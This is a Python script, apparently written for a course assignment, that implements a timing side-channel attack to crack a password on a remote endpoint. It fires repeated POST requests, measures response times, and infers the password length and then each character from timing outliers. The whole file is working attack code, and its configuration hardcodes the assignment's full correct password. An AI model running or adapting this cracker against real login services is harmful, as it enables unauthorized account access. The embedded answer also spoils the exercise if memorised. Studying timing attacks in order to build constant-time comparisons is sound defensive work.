import requests   
import json  
from string import digits, ascii_letters 
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor, wait, ALL_COMPLETED
import numpy as np 
import sys
import os 
from dotenv import load_dotenv

load_dotenv()

class TimeAttacker:
    def __init__(self, attack_params):
        self.host = attack_params['url']
        if 'already_known' in attack_params:
            self.known = attack_params['already_known']
        else:
            self.known = ''
        self.alphabet = attack_params['alphabet']
        self.max_password_length = attack_params['max_password_length']
        self.min_password_length = attack_params['min_password_length']
        self.correct_first_substrings_by_len = {}
        self.password_cracked = False 
        self.current_max_time = 0 
        self.last_cracked_character = None 
        self.character_cracked = False   

    def extract_most_significant_outlier(self, arr, m=6.):
        data = np.array(arr)
        d = np.abs(data - np.median(data))
        mdev = np.median(d)
        s = d / (mdev if mdev else 1.)
        return data[s > m].tolist()  
 
    def guess_password_repeated(self, pwd, repeat=25):
        total_time = 0 
        if not self.character_cracked and not self.password_cracked:
            print(f'Guessing password "{pwd}" of len {len(pwd)} - {repeat} times')
            with ProcessPoolExecutor() as executor:
                futures = [executor.submit(self.guess_password, pwd) for _ in range(repeat)]
                for f in wait(futures, return_when=ALL_COMPLETED).done:
                    total_time += f.result()
            return total_time
        else:
            print(f'Skipping, last character cracked ({self.last_cracked_character})')
            return 0

    def guess_password(self, pwd): 
        if not self.password_cracked: 
            d = {'pwd': pwd}   
            response = requests.post(url=self.host, data=json.dumps(d))    
            response_time = response.elapsed.microseconds   
            if response.status_code == 200:
                self.password_cracked = True
                print(response.content)
                print(f'Correct password found!: {pwd}')
                sys.exit(0) 
            return response_time 
        return None 

    def get_correct_length(self):
        """ use nothing but padding for the password request at varying lengths within expected bounds
        maximum average response time indicates correct length """ 
        print(f'Getting correct length...')
        times = {} 
        with ProcessPoolExecutor() as executor: 
            futures = {executor.submit(
                self.guess_password_repeated, "-" * length ): length for length in range(self.min_password_length, self.max_password_length + 1)}
            for future in wait(futures, return_when=ALL_COMPLETED).done: 
                length = futures[future]
                response_time = future.result() 
                times[length] = response_time 
        _sorted = sorted(times, key=times.get, reverse=True) 
        return _sorted[0]

    def get_next_letter(self, already_cracked, padding_length): 
        print(f'get_next_letter({already_cracked}, {padding_length})') 
        times = {}
        for char in self.alphabet:
            response_time = self.guess_password_repeated(already_cracked + char + '-' * padding_length)
            times[response_time] = char
            outliers = self.extract_most_significant_outlier(list(times.keys()), m=20)
            print(f'Times = {times}')
            print(f'Outliers = {outliers}') 
            if len(outliers) == 0:
                continue 
            else: 
                return times[outliers[0]] 

    def attack(self):
        pwd_len = self.get_correct_length() 
        print(f'Testing with password length {pwd_len}') 
        cracked_letters = self.known
        if len(cracked_letters) == pwd_len:
            self.guess_password(cracked_letters)
        else: 
            padding_length = pwd_len - 1 - len(cracked_letters)
            for _ in range(padding_length): 
                cracked_letters += self.get_next_letter(
                    already_cracked=cracked_letters, 
                    padding_length=padding_length)
                padding_length -= 1 
            cracked_letters += self.get_next_letter(
                    already_cracked=cracked_letters, 
                    padding_length=0)  

if __name__ == "__main__": 
    # protect the hosts in public repo. could get expensive.
    REAL_HOST =  os.environ.get('REAL_HOST')
    DEMO_HOST = os.environ.get('DEMO_HOST')
    attack_params = {
        'demo': {
            'url': DEMO_HOST,
            'max_password_length': 12,
            'min_password_length': 12,
            'alphabet': digits + ascii_letters
        },
        'assignment': {
            'url': REAL_HOST,
            'max_password_length': 13,
            'min_password_length': 11,
            'alphabet': digits, 
            'already_known': '5558675309555' # full correct pw
        }
    }
    demo_attacker = TimeAttacker(attack_params=attack_params['assignment'])  
    demo_attacker.attack() 
 